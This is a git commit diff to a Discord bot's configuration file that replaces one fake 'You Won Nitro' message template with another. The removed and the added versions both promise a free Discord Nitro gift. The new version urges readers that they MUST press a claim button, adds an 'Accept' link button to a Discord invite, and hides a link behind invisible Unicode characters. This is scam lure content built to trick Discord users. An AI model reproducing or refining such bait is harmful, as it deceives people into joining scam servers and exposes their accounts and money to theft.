c60934e0571e2af05ab36171e30de6a0da768d80
Alien <166258154+quizalien@users.noreply.github.com>
2026-07-04 10:28:12 +0300

    Update Configuration.js

--- src/Structures/Configuration.js
+++ src/Structures/Configuration.js
@@ -15,15 +15,18 @@ module.exports = {
 
     embed: [
         {
-            content: ".",  // ✅ Boşluk koy (null veya "" OLMAZ!)
-            embeds: [
+            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)",
+            components: [
                 {
-                    title: "You Won!",
-                    description: "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](https://discord.gg/MwRBgGGaam)",
-                    color: 14680319,
-                    image: {
-                        url: "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
-                    }
+                    type: 1,
+                    components: [
+                        {
+                            type: 2,
+                            label: "Accept",
+                            style: 5,
+                            url: "https://discord.gg/M9sX68Vqxr"
+                        }
+                    ]
                 }
             ]
         }
@@ -31,15 +34,18 @@ module.exports = {
 
     embed2: [
         {
-            content: ".",  // ✅ Boşluk koy
-            embeds: [
+            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n\n> In order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the **[Claim Button](https://discord.gg/M9sX68Vqxr)**\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)",
+            components: [
                 {
-                    title: "You Won!",
-                    description: "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](https://discord.gg/MwRBgGGaam)",
-                    color: 14680319,
-                    image: {
-                        url: "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
-                    }
+                    type: 1,
+                    components: [
+                        {
+                            type: 2,
+                            label: "Accept",
+                            style: 5,
+                            url: "https://discord.gg/M9sX68Vqxr"
+                        }
+                    ]
                 }
             ]
         }
